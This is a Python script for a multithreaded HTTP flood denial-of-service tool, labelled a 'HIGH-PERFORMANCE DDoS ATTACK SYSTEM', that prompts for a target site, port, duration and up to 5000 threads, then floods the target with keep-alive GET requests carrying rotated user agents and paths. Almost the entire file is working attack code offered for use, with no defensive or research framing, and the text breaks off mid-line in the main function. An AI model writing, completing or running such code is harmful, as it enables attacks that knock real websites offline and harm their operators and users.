import socket
import threading
import ssl
import random
import time
import sys
import os
from concurrent.futures import ThreadPoolExecutor

class PowerfulDDoS:
    def __init__(self):
        self.target_ip = ""
        self.target_host = ""
        self.port = 80
        self.duration = 300
        self.threads = 2000  # Increased default for more power
        self.running = True
        self.requests_sent = 0
        self.lock = threading.Lock()
        self.start_time = None
        
    def resolve_target(self, target):
        """Resolves hostname to IP for performance."""
        try:
            self.target_ip = socket.gethostbyname(target)
            self.target_host = target
            return True
        except socket.gaierror:
            return False

    def get_user_input(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        print("=" * 60)
        print("  💀 HIGH-PERFORMANCE DDoS ATTACK SYSTEM 💀")
        print("=" * 60)
        
        while True:
            target = input("🌐 Enter target website (example.com): ").strip().lower()
            if self.resolve_target(target):
                break
            print("❌ Could not resolve domain! Try again.")
        
        use_ssl = input("🔐 Use HTTPS? (y/n, default=y): ").strip().lower()
        self.port = 443 if use_ssl in ['', 'y', 'yes'] else 80
        
        try:
            duration = input("⏱️ Attack duration in seconds (default=60): ").strip()
            self.duration = int(duration) if duration else 60
        except:
            self.duration = 60
            
        try:
            threads = input(f"⚡ Number of threads (100-5000, default=1000): ").strip()
            self.threads = max(100, min(5000, int(threads))) if threads else 1000
        except:
            self.threads = 1000
        
        print("\n" + "=" * 60)
        print(f"🎯 TARGET: {self.target_host} ({self.target_ip})")
        print(f"🔌 PORT: {self.port}")
        print(f"⏱️ DURATION: {self.duration} seconds")
        print(f"⚡ THREADS: {self.threads}")
        print("=" * 60)
        
        confirm = input("🚀 Start attack? (y/n): ").strip().lower()
        if confirm not in ['y', 'yes']:
            print("❌ Attack cancelled.")
            sys.exit()
            
    def create_socket(self):
        """Creates a single, reusable socket for the attack."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target_ip, self.port))
            
            if self.port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=self.target_host)
            return s
        except Exception as e:
            return None

    def flood(self):
        """The main attack function for each thread."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
        ]
        
        paths = [
            "/", "/index.html", "/login", "/api/v1/data", "/search?q=test",
            "/wp-admin/", "/admin", "/images/logo.png", "/js/main.js", "/css/style.css"
        ]

        while self.running:
            try:
                sock = self.create_socket()
                if not sock:
                    time.sleep(0.1)
                    continue

                # Send multiple requests over the same connection
                for _ in range(random.randint(5, 15)):
                    if not self.running:
                        break
                    
                    path = random.choice(paths)
                    user_agent = random.choice(user_agents)
                    
                    payload = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"User-Agent: {user_agent}\r\n"
                        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                        f"Accept-Language: en-US,en;q=0.5\r\n"
                        f"Accept-Encoding: gzip, deflate\r\n"
                        f"Connection: keep-alive\r\n"
                        f"Cache-Control: no-cache\r\n\r\n"
                    )
                    
                    sock.sendall(payload.encode())
                    
                    with self.lock:
                        self.requests_sent += 1
                    
                    time.sleep(random.uniform(0.01, 0.05)) # Small random delay
                
                sock.close()

            except Exception:
                # If anything fails, just continue to the next iteration
                pass

    def start(self):
        self.start_time = time.time()
        print(f"\n🚀 Starting high-performance attack on {self.target_host}:{self.port}")
        print(f"⚡ {self.threads} threads | {self.duration} seconds duration")
        print("💀 Attack in progress... Press Ctrl+C to stop\n")
        
        # Start the status reporting thread
        status_thread = threading.Thread(target=self.print_status)
        status_thread.daemon = True
        status_thread.start()
        
        # Start the attack threads
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                executor.submit(self.flood)
        
        # Timer to stop the attack
        time.sleep(self.duration)
        self.stop()

    def print_status(self):
        """Prints attack status every second."""
        while self.running:
            with self.lock:
                current = time.time()
                elapsed = current - self.start_time
                rps = int(self.requests_sent / elapsed) if elapsed > 0 else 0
                sys.stdout.write(f"\r⚡ Requests: {self.requests_sent} | RPS: {rps} | Time: {int(elapsed)}s")
                sys.stdout.flush()
            time.sleep(1)

    def stop(self):
        self.running = False
        time.sleep(1.1) # Allow last status print
        end_time = time.time()
        elapsed = end_time - self.start_time
        rps = int(self.requests_sent / elapsed) if elapsed > 0 else 0
        
        print("\n" + "=" * 60)
        print("💀 ATTACK COMPLETED")
        print("=" * 60)
        print(f"🎯 Target: {self.target_host}")
        print(f"⏱️ Runtime: {elapsed:.1f} seconds")
        print(f"🔥 Total requests: {self.requests_sent}")
        print(f"⚡ Average RPS: {rps}")
        print("=" * 60)

def main():
    attack = PowerfulDDoS()
    attack.get_user_input()
    
    try:
        attack.start()
    except KeyboardInterrupt:
        print("\n
